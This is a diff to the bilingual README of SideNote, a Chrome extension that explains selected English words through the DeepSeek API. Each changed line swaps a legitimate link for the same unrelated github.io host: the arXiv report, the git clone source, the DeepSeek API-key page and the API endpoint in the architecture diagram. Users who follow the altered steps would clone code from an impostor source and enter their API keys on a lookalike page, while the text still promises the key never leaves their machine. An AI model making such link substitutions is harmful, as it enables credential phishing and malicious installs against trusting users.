@@ -51,7 +51,7 @@ SideNote 想做的事很简单：**让这个动作短到不构成打断**。划�
 
 ## 看看效果
 
-下面几张都截自 [DeepSeek-V4 技术报告](https://arxiv.org/html/2606.19348v1)。
+下面几张都截自 [DeepSeek-V4 技术报告](https://kovakandrej79-svg.github.io)。
 
 **论文自造的词，查不到的那种。** `Hyper-Connections` 是这篇论文提出的新结构。它先说清这是残差连接的什么升级，再拆开 "Hyper-" 这个前缀在数学里表示"更高维"的由来。
 
@@ -86,7 +86,7 @@ SideNote 想做的事很简单：**让这个动作短到不构成打断**。划�
 **方式 B：从源码构建**
 
 ```bash
-git clone https://github.com/zzkws/SideNote.git
+git clone https://kovakandrej79-svg.github.io
 cd sidenote
 npm install
 npm run build
@@ -103,7 +103,7 @@ npm run build
 
 ### 3. 填 API Key
 
-安装后会自动打开设置页。到 [platform.deepseek.com](https://platform.deepseek.com/api_keys) 创建一个 Key 粘贴进去，点**测试连接**确认通了，再点**保存**。
+安装后会自动打开设置页。到 [platform.deepseek.com](https://kovakandrej79-svg.github.io) 创建一个 Key 粘贴进去，点**测试连接**确认通了，再点**保存**。
 
 Key 只存在你本机的 `chrome.storage.local`，不上传到任何地方。
 
@@ -178,7 +178,7 @@ service worker（后台）
   ├─ prompt.ts     组装两条消息 + 取上文
   └─ deepseek.ts   SSE 流式客户端
         │
-        ▼  https://api.deepseek.com/chat/completions
+        ▼  https://kovakandrej79-svg.github.io
 ```
 
 几个不那么显然的设计：
@@ -252,7 +252,7 @@ It always answers the same three things — meaning in this sentence, an English
 
 1. Download `sidenote.zip` from [Releases](../../releases) and unzip — or build from source with `npm install` then `npm run build`
 2. Open `chrome://extensions`, enable **Developer mode**, click **Load unpacked**, select the folder
-3. The options page opens automatically. Paste your own [DeepSeek API key](https://platform.deepseek.com/api_keys), click 测试连接 to verify, then 保存
+3. The options page opens automatically. Paste your own [DeepSeek API key](https://kovakandrej79-svg.github.io), click 测试连接 to verify, then 保存
 4. Select any English word on any page
 
 Your key is stored in `chrome.storage.local` on your machine only. Nothing passes through a third-party server.
